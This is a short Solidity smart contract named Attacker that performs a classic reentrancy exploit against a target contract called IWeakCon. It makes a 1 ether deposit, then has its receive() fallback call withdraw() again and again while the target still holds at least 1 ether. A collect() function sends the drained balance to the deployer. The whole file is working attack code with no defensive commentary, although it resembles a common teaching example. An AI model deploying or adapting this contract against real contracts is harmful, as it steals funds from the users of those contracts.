// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IWeakCon {
    function deposit() external payable;
    function withdraw() external;
}

contract Attacker {
    IWeakCon public weakCon;
    address public owner;

    constructor(address _weakCon) {
        weakCon = IWeakCon(_weakCon);
        owner = msg.sender;
    }

    receive() external payable {
        if (address(weakCon).balance >= 1 ether) {
            weakCon.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH");

        weakCon.deposit{value: 1 ether}();
        weakCon.withdraw();
    }

    function collect() external {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }
}